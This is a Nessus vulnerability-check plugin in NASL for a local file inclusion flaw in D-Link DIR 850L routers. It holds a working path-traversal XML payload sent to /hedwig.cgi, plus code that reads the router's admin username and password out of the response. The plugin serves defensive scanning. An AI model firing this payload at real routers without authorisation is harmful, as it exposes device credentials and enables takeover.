#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(103114);
  script_version("1.5");
  script_cvs_date("Date: 2018/06/14 12:21:47");


  script_name(english:"D-Link DIR 850L Router Local File Inclusion");
  script_summary(english:"Sends an HTTP POST to recover account credentials");

  script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by a local file inclusion vulnerability");
  script_set_attribute(attribute:"description", value:
"The remote D-Link DIR router is affected by a local file inclusion
vulnerability that allows an attacker to execute arbitrary PHP scripts.");
  script_set_attribute(attribute:"see_also", value:"https://blogs.securiteam.com/index.php/archives/3310");
  script_set_attribute(attribute:"solution", value:
"Upgrade to firmware 1.14B07 BETA or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/07/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/07/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/09/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 Tenable Network Security, Inc.");

  script_dependencies("dlink_dir_www_detect.nbin");
  script_require_keys("installed_sw/DLink DIR");
  script_require_ports("Services/www", 80, 8181, 443, 8443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = 'DLink DIR';
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:appname, port:port);

xml_payload = '<?xml version="1.0" encoding="utf-8"?>' +
'<postxml>' +
'<module>' +
'<service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>' +
'</module>' +
'</postxml>';

uri = '/hedwig.cgi';
res = http_send_recv3(
  method:'POST',
  item:uri,
  add_headers: {'Content-Type':'text/xml', 'Cookie':'uid=nessus'},
  data: xml_payload,
  port:port,
  exit_on_fail:TRUE);

if ("200 OK" >!< res[0] || "No modules for Hedwig" >!< res[2])
{
  audit(AUDIT_HOST_NOT, "an affected D-Link DIR router");
}

# search for an account
pattern = "<uid>USR-</uid>\s*<name>([0-9a-zA-Z]+)</name>\s*<usrid>\s*</usrid>\s*<password>([^<]+)</password>";
match = pregmatch(string:res[2], pattern:pattern);
if (!empty_or_null(match))
{
  var report = 
    '\n' + "Using a local file include vulnerability, Nessus" +
    '\n' + "was able to recover the following web ui credentials" +
    '\n' + "from " + build_url(qs:uri, port:port) + ":" +
    '\n' +
    '\n' + 'Username: ' + match[1] +
    '\n' + 'Password: ' + match[2] +
    '\n';
  security_report_v4(severity:SECURITY_HOLE, port:port, extra:report);
  exit(0);
}

audit(AUDIT_HOST_NOT, "an affected D-Link DIR router");
